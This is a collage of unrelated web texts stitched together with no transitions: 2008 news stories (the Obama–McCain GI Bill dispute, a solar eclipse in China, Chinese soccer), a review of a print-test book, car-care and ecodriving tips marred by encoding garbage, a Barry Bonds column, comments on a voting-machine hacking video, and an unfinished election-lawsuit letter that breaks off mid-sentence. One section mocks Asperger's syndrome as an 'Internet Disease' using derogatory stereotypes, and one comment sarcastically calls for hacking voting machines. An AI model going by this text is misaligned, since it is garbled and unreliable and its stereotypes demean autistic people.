WASHINGTON ( AP )  Barack Obama told veterans Saturday that he can't understand why Republican John McCain opposes legislation that would provide college scholarships to people who have served in the U.S. military .
" Now , let me be clear :
No one can dispute John McCain 's love for this country or his concern for veterans .
But here 's what I do n't understand .
I do n't understand why John McCain would side with George Bush and oppose our plan to make college more affordable for our veterans , " the Democratic presidential candidate said .
" George Bush and John McCain may think our plan is too generous .
I could not disagree more . "
Obama 's criticism renews a clash that turned personal after the Senate approved the scholarship bill Thursday .
During the Senate debate , the Illinois senator questioned why McCain a Navy veteran and former prisoner of war would oppose the measure .
McCain responded with a sharp statement saying that he would n't listen to any lectures on veterans ' affairs from Obama , " who did not feel it was his responsibility to serve our country in uniform . "
Obama , speaking to reporters aboard his plane Saturday , countered that the idea that he can't speak on veterans ' issues because he did n't serve in the military " makes no sense whatsoever . "
" I did n't serve , as many people my age , because the Vietnam war was over by the time I was of draft age and we went to an all - volunteer Army .
But obviously I revere our soldiers and want to make sure they are being treated with honor and respect , " he added .
The Arizona senator opposes the scholarship measure , as does the Pentagon , because it applies to people who serve just three years .
He fears that would encourage people to leave the military after only one enlistment even as the U.S. fights two wars and is trying to increase the size of the Army and Marine Corps .
Instead , McCain and Republican colleagues proposed a bill to increase benefits in conjunction with a veteran 's length of service .
Senate Democrats blocked that measure .
" While Barack Obama engages in the same tired partisan politics that has failed our veterans time and again , John McCain has offered legislation that will expand needed education benefits for veterans while promoting retention in our armed forces , " McCain spokesman Brian Rogers said Saturday .
Only three primaries are left in the battle for the Democratic nomination , and Puerto Rico is holding one of them .
Puerto Ricans can vote in party primaries but not in the fall general election .
Clinton spoke at an evening rally in Aguadilla , where she reminded the crowd of her ties to Puerto Rico as a first lady and then as senator from New York , which has approximately 1 million Puerto Rican residents .
" My commitment to Puerto Rico did not start last month or last year , " she said .
" I will always be your voice as president . "
Through her speech , Clinton drew applause by insisting Puerto Ricans should get the same tax breaks , health care and economic opportunity afforded mainland U.S. citizens .
" You deserve a president who will give Puerto Rico 's issues as much attention as the president gives to any state , " she said .
Both candidates are hoping to increase their share of the 55 delegates who will be chosen June 1 .
After Obama 's speech , he led a caminata a short political parade through the streets of Old San Juan .
With an oceanfront park on one side and colorful colonial buildings on the other , Obama shook hands with cheering fans as scores of supporters marched behind .
Occasionally , he clapped or wiggled his hips to the Latin beat of his campaign song .
About 100 pro-independence advocates noisily protested a couple of blocks away .
" Presidential primary is colonial trickery ! " they chanted , criticizing both Obama and Clinton for not pledging to resolve Puerto Rico 's status remain a territory , become a state or declare independence .
But Obama was careful not to get caught up in the controversy , repeatedly saying that Puerto Ricans should be given a chance to decide their status for themselves .

Dear Lulu , The New Standards
It ’s funny how things change .
Five years ago I would n’t have given second thought to producing print material with digital printing .
No , only offset printing .
The thought of a brochure , annual report or catalog printed as if it had come out of Kinko ’s — excuse me , FedEx Office — was just unbearable and even the much - hyped and pushed feature of individual customization — Dear Jon , from Chicago , IL 60660 … — did n’t seem to be much draw .
And seeing samples of digital printing where a block of color looked as if it had been filled in with streaky watercolors and colored type looked as coarse as the graphics in an Atari 2600 game did n’t help either .
Needless to say , digital printing technology has improved vastly and so has the quality of the finished product , which , like offset printing , has a range of quirks that have to be tested as you go to be improved .
Over the years , printers and paper manufacturers have produced elaborate promotional materials that show you how to make the best of offset printing by showcasing examples of 1- , 2 - , 4 - , and 6 - color printing , varnishes , skin tones , gradients , metallics , and subjecting papers to all sorts of other processes equivalent to being crash test dummies .
More or less , the art of offset printing has been properly documented and even mastered .
Now it ’s digital printing ’s turn .
Well , sort of .
This past July , fourteen students attended a two - day workshop at Germany ’s Hochschule Darmstadt University of Applied Sciences with Prof.
Frank Philippin and London - based designer James Goggin .
The brief , as explained by Goggin :
My plan for the workshop is to investigate the visible and tangible parameters of graphic design — type specimens , halftone screens and , in particular , colour tests and calibration charts — and make a book of our own self - produced tests which we will send to print on Friday afternoon using the online print - on - demand system Lulu .
The book project will therefore act as a colour / type / pattern test of the very system with which it is produced .
“ Print - on - demand ” is an increasingly important production system which can serve to make us designers rethink the impact our profession has on the environment and to question the often wasteful print volumes and production methods requested of us by our clients .
Graphic designers , and especially students , have a chance to use and subvert these relatively new ( and fairly cheap ) technological systems to our advantage .
The result of the workshop is Dear Lulu , a fantastic and imaginative resource that puts digital printing to the test through a Do - It - Yourself presentation that fits right in with philosophy of print on demand that makes it such an alluring proposition for designers looking to publish with little financial risk and with pretty decent results in return .
The first section of the book testing color portraits , shows the students , each dressed in a different color , posing outside in still life photographs featuring other random items in the same hue .
The photos are then reproduced as CMYK , RGB , Grayscale and Half - tone so that you can see which color model is better — pretty amazing that RGB prints so well , and pretty amazing to think that sending an RGB to offset printing could cost a designer his or her job or thousands of dollars to reprint the washed out photo .
Line and pattern tests are interesting , just to see how far you can go with thick and thin lines and how crazy you can get with radiating patterns .
The typography tests are very helpful , as I think it ’s always been the weakest point of digital printing .
Black type always looks good , as it just requires drawing ink from the black “ cartridge ” of a printer much like offset printing , but whenever color type enters the equation , things get messy quickly , but as is clear in the book , as long as you do color type on a white background it will look pretty good .
A surprising thing from this book was to see how well small type ( around 4 pt ) in black holds up , and also when reversed .
One of the most interesting sections of the book is in the end , where the students test the finishing capabilities by seeing how close to the edge you can get , and drawing guidelines to see how straight the trimming is .
My copy on page 96 demonstrates how things are not perfect :
At top edge of the page there is text that says “ Good Cut ” and to its left I can see the very bottom of text , positioned outside of the document ’s margins that says “ Bad Cut . ”

Dear Lulu is a great tool to test digital printing .
You can do it for Lulu , of course , by purchasing the book but you can also do it for your own printer by downloading a free PDF .
The book lacks the sophistication of your typical paper or printer promotion but , as I mentioned , things change .
Graphic design is no longer solely about the most beautiful photograph or the most expensive paper in the most refined layout :
It ’s about effectively producing messages and experiences that can be easily distributed .
GreenHeart Concept Phone Spotted in Copenhagen
September 29th , 2008 by Ariel Schwartz
GoodCleanTech reports that the Sony Ericsson Greenheart Concept phone was spotted at a Sony event last week in Copenhagen .
The phone will be an amalgam of “ green ” factors , including a bio-plastic shell , HTML - based manuals , a recycled plastic keypad and an energy - efficient charger that uses only 3.5 mW of power during standby .
In comparison , most efficient cell - phone chargers use 30 mW on standby .
The Greenheart concept was announced last week along with a new environmental warranty for Sony Ericsson phones .
With the warranty , the phones can be recycled anywhere in the world if brought to designated drop - off areas .
Currently , there are over 500 drop - off areas , and Sony plans to add more in the future .
The release date for the Greenheart phone is currently unknown , but its design should be an inspiration for all cell - phone manufacturers striving for environmental friendliness .

Like the wind crying endlessly through the universe
Time carries away the names and the deeds of conquerors and commoners alike .
And all that we are , all that remains , is in the memories of those who cared we came this way for a brief moment
A disease is sweeping the Internet .
It preys on the fat , the moody , the anti-social , the lazy , and those very people that once formed the core of Internet users .
It can strike at any moment , but is ironically most likely to infect those that have been warned about the disease .
This illness is rarely diagnosed willingly by medical professionals , but is so commonly self - diagnosed as to approach an epidemic .
I am referring to Asperger 's Syndrome , the plague of the 21st century , but you can call it Internet Disease .
Let 's turn to Merriam - Webster for the definition of the disease .
According to Wikipedia ( which I suggest you avoid for fear of contracting the disease ) symptoms of Asperger 's include :
Impaired social interaction .
Inability to read expressions or make eye - contact .
Lack of empathy .
No sense of humor .
Inability to cope with criticism .
Hyperfocus on tasks and rituals .
Logical patterns of thought .
Clumsiness .
Really good at videogames .
Furry artwork .
The symptoms make a person with Asperger 's Syndrome sound like Vulcan 's biggest asshole , but the reality is much more depressing .
Victims of Asperger 's are socially - crippled and crabby , often obese or horrifyingly skinny , through absolutely 100 % no fault of their own .
They are not responsible for their actions or behavior .
To provide insight into the plight of Asperger 's sufferers I would like to transport you to the world of a 19 year old female suffering from Asperger's .
Her name is Zeph Mercurial .
She explained her condition on our forums , so I will allow her to speak in her own words .
JIAYUGUAN , China ( Reuters ) - Darkness fell over the last outpost of the Great Wall of China on Friday , where a rare total solar eclipse ended its journey across the earth , delighting skywatchers one week before the Olympics open in Beijing .
The stellar spectacle - when the moon passes between the sun and the Earth - began in Canada , tracked across Greenland and crept into Siberia , before ringing in the momentous month of August in China , when it will host the Games .
In northwest China , cheers went up from the Jiayuguan Fort as hordes of tourists welcomed the eclipse .
“ It ’s really doubly special , because I ’m standing here on the Great Wall and watching it , ” said Feng Lei , a backpacker from the China ’s southwestern province of Sichuan , who was making his way to Beijing for the Olympics .
Eclipses were considered dark omens by ancient Chinese astronomers but many Chinese view this one as particularly fortunate as it comes exactly a week before the torch is lit in Beijing for the opening ceremony of Games designed to restore China ’s pride and showcase its achievements .
“ I have a really deep feeling , especially because it ’s exactly eight days before the Olympics , ” said Chuai Rui , college student from Xi’an .
Chinese consider eight a lucky number .
In Russia , thousands had flocked from around the world to Novosibirsk , mixing awe with excitement as day turned into night .
All gazed in wonder as an eerie silence descended on the Siberian city and gusts of unusually strong wind tore through the crowd of skywatchers .
Birds stopped chirping and the temperature suddenly dropped , a Reuters TV reporter there said .
In Russia ’s second city of Petersburg , people shouted “ Look ! Look ! ” and pointed as the sun ’s outer corona appeared in the sky .
“ You just feel part of nature .
...
This is so rare , ” said Lev , a software specialist in St Petersburg .
Several thousand people turned out at a park in Norway ’s capital , Oslo , where the eclipse was near 50 percent , to peer up at the sun through dark glasses in cardboard frames and see pictures of the total eclipse beamed onto a large screen from an plane tracking the phenomenon in the Arctic .
Many in the Oslo crowd , which included many families with small children , tried photographing the eclipse , some with their mobile phones pressed against their eclipse sunglasses .
“ There ’s a strange light now , ” said Norwegian astronomer and popular author Knut Jorgen Roed Odegaard as the eclipse progressed and the midday light in Oslo grew slightly dimmer with a silvery sharpness .

“ These are historical pictures , ” he said as real - time photos from a Norwegian air force plane appeared on the big outdoor screen to show the total eclipse from the Arctic .
A NEW ERA
In China where the eclipse ended , planeloads of foreigners converged to watch the sky go dark .

The Chinese hope the Olympics will usher in a new era where China is once more as modern , wealthy and important as it was more than 10 centuries ago , when imperial astronomers were among the world ’s best scientists .
Chinese astronomers in the state of Lu , the present - day Shandong , carefully recorded solar eclipses that can be dated as far back as 720 BC .
Superstitious Chinese courtiers and peasants once banged drums to scare away the dragon they thought was eating the sun .
These days , while people still find their lives can be touched by eclipses , the modern view is a little more philosophical .
“ I was born during an eclipse , and I have always felt that ’s made my life more fortunate , ” said a driver named Zhou .
“ But I did n’t turn out to have any special genius , so I ca n’t say the eclipse left any mark of fate or destiny on me . ”
EcoDriving 101 – Reducing Speed
This post is part of a series on basic ecodriving techniques , intended to expound upon a more basic description in order to make them more accessible as well as put them in the context of safety and practicality . Â
Reducing your speed is one of the simplest things you can do to increase fuel economy .
Â
Keep in mind I did not say it is the easiest thing to do .
Â Â Iâ€™ll admit it , most drivers like speed .
Â Â But , it is a very simple thing to do .
Â
You just have to let off the pedal a little bit .
On average , a 5 mph reductionÂ at highway speedsÂ ( ex. From 70 to 65 mph ) will net you an 8 % increase in fuel economy .
Â
Of course this differs from vehicle to vehicle .
Â
The larger your vehicle the larger you gain is likely to be .
Â Fueleconomy.gov says that you can see betweenÂ 7 to 23 percent increase in mileage simply by slowing down to the speed limit .
Â
What about even a little bit under the speed limit ?
Here is a some testing done by MetroMPG.com comparing speed to mileage .
There is alsoÂ the fact that Â the speed limitÂ is also a much safer speed should speak volumes to the car buyers who buy large vehicles because they are safer .
Â
If you really want to be safe , slow down to recommended speeds .
Â
Road engineers design roads with these kinds of things in mind .
A little more on the technical side is the fact that aerodynamic drag increase exponentially with speed .
Â Â So , if you double your speed you have quadrupled your aerodynamic drag .
Â
So , you can see small increases in speed can drastically increase drag .
Â
Aerodynamic drag is also the main force your engine must overcome while traveling at highway speeds .
So , since your going slower your going to be late all the time now , right ?
Â I sure hope not .
Â
Slowing down from 60 mph to 55 mph on an hour trip takes you roughly 5 more minutes .
Â
Anything less than an hour trip is going to be less and for that 8 % fuel savings you are sure getting a good deal .
The last thing I will mention is stress .
Â
How many times have you come up on a car going slower than you , Â and gotten all flustered as you try to find a way to zip past it ?
Â
Stress is a serious issue with people these days .
Â
Your daily drive can be a great time to unwind after a stressful day at work .
Â Â Its a lot easier to unwind while just cruising along at the speed limit where you do n’t have to worry about that slow poke who wo n’t get out of your way as you rush home .
Â
Take a few minutes longer to get home and feel better at the same time .

" If security measures require to send a dog into a house , then it has to be done .
I think ACPO needs to consult better and more widely .
Many Chinese would say that is an insult to Brazilian table tennis players .
“ It ’s so beyond an embarrassment that it almost seems like a comedy , ” a popular soccer columnist , Li Chengpeng , said in an interview before the match .
“ We ’ve cried our tears dry , and now it ’s time for us to enjoy the big show , because you never know how our team is going to lose this time . ”
Soccer presents the biggest conundrum for the Chinese sports machine  the country has the money , the population and the fan base to put together a world - class team , yet has not succeeded .
The men ’s national team has been to the World Cup only once , when Japan and South Korea were the hosts in 2002 , but it failed to score a goal in three games .
In 2004 , Chinese fans nearly rioted in Beijing when China lost the Asian Cup final to Japan , 3 - 1 .
The latest embarrassment came in June , when the team lost to Iraq in a World Cup qualifying match , 2 - 1. China was later eliminated from qualifying for the 2010 World Cup in South Africa .
Chinese leaders generally try to silence widespread criticism of national symbols , but with men ’s soccer , the government allows people to vent .
Everyone piles on , including state news media like CCTV and Xinhua , celebrity sports bloggers , even other athletes and coaches .
Fans also openly deride the head of the government - run Chinese Football Association , Xie Yalong , a former senior official from Shaanxi Province .
“ Xie Yalong must resign ! ” became a loud chant at the last two Olympic matches , and Xie was seen leaving the Belgium match early .
Many Chinese sports analysts and scholars point to endemic corruption within the association as one cause of the sport ’s ills .
The association started the current league system in 1994 , and soccer became the first sport to achieve commercial success in China , with sponsors pouring in millions of dollars .
Xu Guoqi , a professor of East Asian history at Kalamazoo College and the author of a new book on China and the Olympics , said Chinese soccer would improve only after the rule of law is established in China .
He said disappointment with soccer could lead to the next “ major revolution ” in China .
And he was not joking .
“ Without rule of law , corruption will get involved , and nobody is responsible to anyone , ” said Xu , who wrote an op - ed article in The Washington Post last month lamenting the state of Chinese soccer .
“ If Chinese continue to be obsessed with soccer , they ’ll definitely demand something dramatic , something political or involving rule of law .
It will start with sports , and then it will move onto something bigger . ”
The top 10 ways in which people kill their cars .
" Are you killing your car ? "
Are you killing your car ?
The old mantra if you look after your car , your car will look after you certainly holds true .
Car ownership is becoming more and more common with many households running 2 or more cars .
Sadly though few drivers are sympathetic to , or fully understand the way their car works .
A little knowledge will keep your relationship with your car running smoothly !
Without realising it many drivers are actually damaging their car or at very least running up a hefty repair bill .
Here are the top 10 things that TorqueCars sees people doing every day completely oblivious to the consequences .
Most of these points will at the very least hit us in our pockets in the near future .
1. ) Missing oil changes and servicing - Engine oil is the vital component in your car .
Some people will wrongly assume that if the car takes 5 litres of oil and they have topped up this year by 5 litres that there is no point in changing the oil .
Oil degrades , and the reduction in oil level is due to the thinner high quality oil getting burned or just seeping out of the engine .
The sludge , grime and metal particles build up in the residue so topping up is not the same as changing the oil .
The oil level is dangerously low in over 70 % of cars - check your oil levels today .
2. ) Incorrect tire pressures - cause additional heat to build up in the tires due to the extra flexing .
The car has to work harder reducing your fuel economy .
With under inflated tires the handling becomes unpredictable at best .
Braking is also significantly reduced .
3 ) Not allowing turbo to cool down - How many people with turbo driven engine drive it hard and then fail to allow the turbo to cool down properly ?
In Europe more and more production cars have turbos to meet emissions and power requirements .
The turbo is spinning at between 100,000 rpm and 200,000 rpm and gets very hot , the moment you turn off the engine you starve it of fresh oil , unless your cars oil pump keeps running .
The oil in the turbo gets fried and essentially leaves your turbo spinning with no lubrication .
Modern synthetic oils are more resilient but we would still allow a spool down period after a spirited drive .
Your turbo will need replacing more frequently if this is your driving style .
4. ) Driving hard on a cold engine !
Do n't use higher engine RPMs when cold - until an engine is warm it will run rich .
Your engine is most at risk from damage when cold , so putting undue stress on it by high revving will exponentially increase the damage done .
The combustion process does not become efficient until the engine reaches its operating temperature .
An inefficient burn leaves acids and other toxins that eat your engine .
The oil also takes a short while to flow properly so ideally you would let the engine tick over for 3 - 10 seconds , then drive off at a steady pace keeping under 2-3000 rpm .
Do not use the top half of the rev range until the engine reaches operating temperature .
This applies as much to modern engines with catalytic converters as it does on older engines .
Do n't leave the engine idling to warm it up , just drive it ( after giving it 30 seconds for the oil pressure to come up ) !
5. ) Short journeys - Just as driving off too quickly damages an engine so will doing short journeys .
The problem with a short journey is that the engine never reaches its operating temperature .
So for the reasons detailed in the driving off too quickly do not drive short distances .
( Use the under 1 mile - walk philosophy ! )
The engine oil needs to reach its optimum viscosity to properly lubricate the main moving components in the engine .
While cold the catalyst is unable to operate at peak efficiency thus reducing the life of your expensive catalyst .
6. ) Revving too high -
The red line indicates the maximum permissible engine speed .
At this point the engine is under enormous stress and the components are moving at their fastest speed .
Slight imbalances in the engine are emphasised at high rpm and if you prolong the high rpm for a period of time you will more than likely throw a connecting rod through the sump ( or worse ) .
The older an engine is , the lower the red line should be .
You should only rev an engine when it has properly warmed up , keep to the lower third of the RPM range until then .
( see point 4 )
As an engine starts to produce most of its power across the middle third of its rev band there is little point exceeding this .
7. ) Hand on gear stick -
So many people do this but it can actually cause premature gear wear , especially if you wiggle the stick around .
The stick is connected directly to the gearbox ( in many cars ) so the slightest pressure is transmitted to the gear selector .
This is enough to cause wear and eventually your gearbox will start to grind and crunch as you change gear .
8. ) Riding the clutch - Again keeping a foot on the clutch is enough to prevent it from fully engaging .
The clutch plate will tend towards slip and will prematurely wear .
Keeping the clutch depressed in traffic or at traffic lights is also a bad idea .
Just put the car in neutral when you are stationary .
When the clutch is depressed your are forcing the clutch against the release bearing .
Eventually the release bearing will just give up having done 60,000 miles worth of pressure in just 10,000 .
9. ) Wrong gear selection - Nothing puts a strain on the engine like forcing it to pull the car in the wrong gear .
Too high a gear strains the bottom end of the engine around the crank and con rods .
Too low a gear will mean you are revving more than you need to so the top end of the engine around the valves , cams and lifters are working too hard .
10 . ) Driving a dirty car -
This one is a little contentious but corrosion takes effect more easily on a car which is covered with a layer of dirt .
A thorough clean each month and a coat of good quality wax ( not polish ) will do much to enhance the cars defence against corrosion .
So how many of these are you guilty of ?

Justice : Astros should consider bringing in Bonds COMMENTARY
Recommended Video :
Hello , Barry , this is Drayton .
Are you ready to be a champion ?
The Astros need a left fielder .
I know the name of a good one .
He ’s rested and ready .
He ’ll bring a buzz to the ballpark , too .
He would suddenly make the Astros baseball ’s most interesting team .
What ’s wrong with having a little buzz ?
Why should the Dallas Cowboys have all the fun ?
Barry Lamar Bonds would be a perfect fit for the Astros .
Is there one good reason not to sign him ?
No , there ’s not .
Oh sure , some people do n’t like him .
These are people that do n’t know him , but still .
To say such a thing presumes you know the players on the team now .
You do n’t know them .
You can pretend to know them , but you do n’t .
Baseball is a bottom - line business .
Bonds would make the Astros better .
If Drayton McLane really and truly wants to be a champion , he ’d bring in the best offensive player on earth .
Our local nine has been winning .
Just as the team is closing in on .500 , one of its two best players , Carlos Lee , goes down with a broken finger .
What would the Rockets do ?
They just went for a guy that has done far worse things than Barry .
Some of you have compared Ron Artest to Barry Bonds .
I ’m going to presume you ’re having a bad day .
Trust me when I tell you Barry is vastly overrated as a bad guy in the clubhouse .
He ’s a little prickly at times , a little standoffish , but who among us is n’t ?
Jeff
Kent did n’t always whistle when he walked in the clubhouse , and he has turned out to be one of the all - time best guys to have on a baseball team .
Besides , Barry would be thrilled to get another shot .
He thinks he has been blackballed .
Maybe he has .
That ’s beside the point .
Even if commissioner Bud Selig does n’t want him in the game , it ’s Drayton ’s job to do what ’s best for his club .
Go for it , Drayton .
Since Barry got big , there ’s almost no argument about his being the best offensive player ever .
He changes games unlike any other player .
Opposing pitchers began preparing for him an inning before he was scheduled to hit .
If Cecil Cooper batted Barry third , Lance Berkman suddenly would be leading the world in RBI opportunities .
The Astros would n’t have an empty seat in the house , and you know how many hot dogs that will sell .
Hear that sound ?
That ’s the cash register ringing .
Rule the airwaves
With one move , the Astros would blow Michael Phelps , Manny Ramirez and Brett Favre right off ESPN .
Drayton would be the man .
Think of the TV time for you , Drayton .
For me , too , but that ’s beside the point .
The entire country would be talking about the Astros .
If Drayton is unsure about Barry , he should poll his players and manager .
Ask Cooper if he ’d like to have Barry in his lineup .
Ask Berkman and Roy Oswalt if they ’d like to have Barry as a teammate .
Do n’t tell me that Barry used steroids and lied about them .
So we ’re now getting religion on steroids ?
Listen , we ’re all going to have to wrap our minds around steroids and their impact on the game .
I admit to not being there yet .
This is n’t about putting Barry in the Hall of Fame .
This might shock you , but Barry is n’t the only big leaguer who apparently used steroids .
What makes Barry — and apparently Roger Clemens — different is that they got unlucky .
Their dealers got busted by the feds .
They were exposed while others were allowed to keep their secrets .
We know things about Barry and Roger that we do n’t know about others .
Plenty of other big names used steroids , too , and every time there ’s a knock on the door , they might wonder if the boys and girls in windbreakers and badges are going to be there .
Other big names are going to be revealed .
To think it ’s just Bonds and Clemens is folly .
Speaking of Clemens , he dug his own grave .
If he ’d confirmed everything in the Mitchell Report , the reaction would have been a collective yawn .
There ’s no way 21 injections contributed significantly to 354 victories .
Clemens set off on a course that may very well land him in prison .
If Drayton passes on Barry because he ’s worried about his franchise ’s reputation , I ’ve got some bad news for him .
The Astros have no reputation .
No one outside Houston cares .
Inside the industry , their reputation is n’t great .
The industry thinks Drayton does a lot of dumb stuff .
Like refusing to spend on draft choices and running off a great general manager .
Baseball people whisper that he ’s a nightmare to work for .
There ’s not a single valid reason not to sign Bonds .
Because he might be a jerk ?
Are you kidding me ?
I hate to tell you this , but we ’ve had some players who drank too much and maybe were n’t completely faithful about their marriage vows .
That ’s real life .
The home clubhouse is no different than your office or mine .
Cloud of investigation
It ’s only silly people like me who sometimes put ballplayers on a pedestal when they ’re just normal men with normal weaknesses who happen to be able to do amazing physical things .
The government investigated Bonds for 21/2 years before indicting him .
Drayton has admitted to being bothered that the government devoted so much time and money to bringing down a baseball player .
Beware , Roger Clemens and Miguel Tejada .
You ’re on their list , too , and if Barry ’s case is an example , they ’ll take however long they need to build a case .
Sleep well , boys .
Someone could be going through your garbage at this very moment .
We ’re getting off topic here .
The Astros need a hitter , and Barry might be the greatest who ever lived .
A no -brainer , right ?
Frankly , the Astros have a reputation for wanting guys who look and sound alike .
Barry is n’t like any of the other Astros .
Nothing wrong with that .
Let ’s do it .

" UC Computer Scientists Release Video on How to Hack a Sequoia Touch - Screen Voting Machine "
( 21 Responses so far ... )
COMMENT # 1 [ Permalink ]
... leftisbest said on 9/9/2008 @ 11:58 pm PT ...
This is likely the most significant and damaging video of Sequoia ever published .
It pulls the eyelids off all the lies Sequoia has manufactured about the problems being with voter - errors , poll worker errors , ROV staff errors , but NEVER with the incredibly primative " security " software and hardware barriers erected by Sequoia .
Sequoia ALWAYS had the answer - it was to point the finger anywhere but at itself .
It is time for Counties to rise up in unison and sue Sequoia for violation of warranty of merchantability and false advertising .
It has never delivered a dependable product , has ALWAYS been extremely vulnerable to insider and Sequoia support fraud , yet seeing it demonstrated so blatantly here makes it all so easy to understand how an election can be flipped in a matter of seconds .
Elections officials , Boards of Supervisors , and election integrity advocates should all be on the same side after viewing these two videos ( one is 9 minutes and the second one is 7 minutes ) .
It is really critical to stay and watch the second one as well , it shows how the hardware seals are useless against anyone bent on defeating the seals and shows how critical it is to have the machines 100 % totally secured at all times .
Any " sleepovers " where machines are stored in public locations ( like public bathrooms in Riverside ! ) , poll workers ' homes and garages , etc. for up to 10 days or more before the election make them easy targets for any political operatives , of either party .
The second video also shows how the Sequoia Optec 400 C high - speed programmable scanners are also easily ( but with a bit more difficulty ) hacked in a period of minutes .
No longer can elections officials claim that it can't happen here , not with Sequoia equipment .
This information was released a year ago in the Red Team report from the Secretary of State 's office report , but only now are we seeing it demonstated so vividly .
Seeing IS believing .
And NO , it 's not because they ( the scientists ) had access to all the Sequoia proprietary code and unlimited working time .
So do the Sequoia technicians who offer " patches " to be installed whenever they say they are needed , without getting them approved by the Secretary of State .
These " patches " could contain exactly the kind of trojan horses demonstrated in the video .
And since the ROVs are not allowed to see the software , they are unwitting partners to any scam Sequoia choses to run .
The gig is now up - electronic voting machines and electronic counting machines cannot be trusted - do not trust that which you cannot see .
The ONLY way to ensure transparent , accurate and secure elections is to require all paper ballots and hand count them in the precincts on election night before they ever leave the precinct .
Post the results with a copy going to the central tabulator ( if one is still employed ) and then match the hand count against the machine .
Hand counts , done twice before ever leaving the precinct ( performed by a fresh team of election board members ) have a much higher likelihood of being correct than a hackable , manipulitable , programmable black box where no one can see the bits and bites whizzing around in cyberspace .
Electrons and Elections do n't mix .

It is frightening and hard to believe that our elections are still mostly at the mercy of such deliberately flawed technology and corrupt government officials .

This video is too slow , long and methodical to keep the viewer 's attention .
I am as rabid about this stuff as anyone , but I was getting bored with it .
There needs to be an edited , punched - up version that is only two or three minutes long ( with a link to the longer version , possibly ) .

I agree with Shakespurr .
It is WAY too long .
We do n't need to see the " voter " punching every possible vote in every scenario .
We get the idea .
It can cut to the chase on each of the scenarios , and get the second video contents onto the shortened one b/c it shows the ease with which the seals are defeated and how the Optech 400 - C can be compromised .
Otherwise the media wo n't do squat with it .
Who do we need to get to to see about shortening this up and reissuing it ?

So what does Bowen say about this ?
What is the EAC doing about it ?
Long story short , what are those ' in charge ' of ensuring the integrity of the vote doing to address this issue because it is not only Sequoia but the other vendor machines as well ?

What this country needs is several hundred dedicated , reasonably computer - savvy folks with nothing to lose , who will hack voting machines on election day and then confess .
This would be a guaranteed way to 1 ) ensure recounts of the 11/4/8 vote , and 2 ) bring to light the ridiculous ease with which one may steal an election .
Of course , the brave hackers would also be prosecuted for voter fraud .
Which could be a bummer , I suppose .
Now is the time for all good hackers , crackers , and phreaks to come to the aid of their party .
Dear Fatherland Homeland Security , the above is intended to use sarcasm and exaggeration to illustrate the plight of the endangered legitimate , counted vote in US elections .
I do n't actually expect , nor would I encourage , any person to hack an election on a lark .
We all know it is serious business --- ask Wally O'Dell .
I would never dream of doing that .
So please do n't kill me , 'kay ?

Lose your house , lose your vote -- Michigan Republicans plan to foreclose African American voters By Eartha Jane Melzer 10 Sep 2008
The chairman of the Republican Party in Macomb County Michigan , a key swing county in a key swing state , is planning to use a list of foreclosed homes to block people from voting in the upcoming election as part of the state GOP ’s effort to challenge some voters on Election Day .
" We will have a list of foreclosed homes and will make sure people are n't voting from those addresses , " party chairman James Carabelli told Michigan Messenger in a telephone interview earlier this week .
WTF !!
So now people who have been put out on the street by the bush administration can no longer vote ?

Retail commerce really solved the problem of accurate record long ago by the expedient of giving the client a hand - held receipt which had to match the record of the machine .
HAVA mandates the paper record ( See Section 301 ( a ) ( 2 ) ( B ) ( i ) ) , so if voters bring their receipts to the neighborhood precinct when the polls close , and match their receipts to the individual records of the machine , it 's an adequate audit .
If discrepancies result in fines to the BoE , to be rendered to the offended voter , that should encourage voters to bring in their receipts for matching .
It still is n't too late to win election integrity .
A writ of mandamus from the Supreme Court would do it .
Perhaps you can help the following proposal along ?
With original jurisdiction in an election fraud lawsuit against the President and a writ of
mandamus within that lawsuit , the Supreme Court ( minus Bush appointees Roberts and
Alito ) could , before November , order all Boards of Election to guarantee election
integrity with public audit and , in view of the home foreclosure crisis , Election Day
registration .
Dear Friend ,
The advantage of a writ of mandamus from the Supreme Court to the nation ’s Boards of
Elections is that any Board that does not insure true election with a public audit will be in
contempt of the Supreme Court , and , if the writ mandates Election Day registration in
recognition of the mortgage foreclosure crisis , numerous impediments to the right to vote
can be truncated .
Such a writ would involve minimal change .
HAVA already mandates the paper record
with the manual audit capacity .*
A voter receipt would simply require a duplicate copy
of what the machine has registered .
It should cost nothing to have an interested public
observe the counting , posting and reporting of votes at every precinct .
Books , articles , websites , films and at least one thousand page lawsuit have documented
election fraud .
They were powerful forces that won Bush vs Gore in 2000 , considering the specious
argument that counting the ballots discarded by chad - gorged machines would violate the
one man -one vote Constitutional prescription .
A national mobilization would be needed
to counter those forces in a The People vs The President of the United States lawsuit .
However , with an aroused citizenry and the machinery provided by the Internet
revolution , it should be possible to do this .
What is needed is a prepared lawsuit , a website for establishing support pledges of names
and money , and a widespread initiation of the true election movement .
A suggested letter
is below .
Please consider taking on this very important chance to win American freedom .
* Help America Vote Act Section 301( a ) ( 2 ) ( B ) ( i ) Peace ,
- Jean G. Braun , South Euclid , Ohio Letter to Americans
As he made clear in his Democratic nomination acceptance speech , - “ ... I argued for more resources
and more troops to actually finish the fight against the terrorists who actually attacked us on 9 - 11 ... ” -
Barack Obama is one with John McCain in fundamental support of the war on terrorism .
Dear Friends ,
Currently , the nation has the presidential choice between a major party candidate who supports the
war on terrorism , and a major party candidate who supports the war on terrorism .
While the
conventional wisdom posits that no independent or third party candidate can be elected , many
Americans are realizing that that is true because the election process is controlled by only two
parties .
Electronic machines which control the movements of ships millions of miles out in space can
only too easily be programmed to give predetermined voting results .
It is a fateful time .
American warships carrying weapons of mass destruction sail the seas .
Foreclosures and bankruptcies offer opportunity for a wealth and power elite to buy up more wealth
and power for pennies on the dollar .
Deficit spending by government means crushing price inflation
for the people .
The nation urgently needs to hear independent voices with independent solutions .
An “ original jurisdiction ” - meaning the Supreme Court would be the first to try a case , ( as in
Florida , 2000 ) - election fraud lawsuit on George W. Bush , has been prepared and a summary posted
at www._______________.
In addition to petition for a writ of mandamus ordering all Boards of
Election to guarantee election integrity ( ** See below ) , the suit demands monetary compensation in
the amount of $ ____________________for all U.S. citizens who , by election fraud , have been robbed
of their Democracy birthright .
If sufficient grassroots names and money support such a lawsuit , it can be successfully filed , but a
national mobilization is needed .
If you wish to see this lawsuit succeed , please : 1 . Forward this or a similar letter to an address in each of eight institutions in your State :
Third party ; peace and justice organization ; university or school ; business ; union ; church ; civic or
other organization ; city government .
2 . Canvas your own organization or list , asking members to pledge their name and any
amount of money .
Total these and post the number of pledged names and the “ bundled ” amount of
pledged money in the designated space on the _______________ website .
3 . After the filing of the lawsuit , follow further instructions regarding names and funds .
With guarantee of election integrity , “ no strings ” candidates with needed voices to add to the
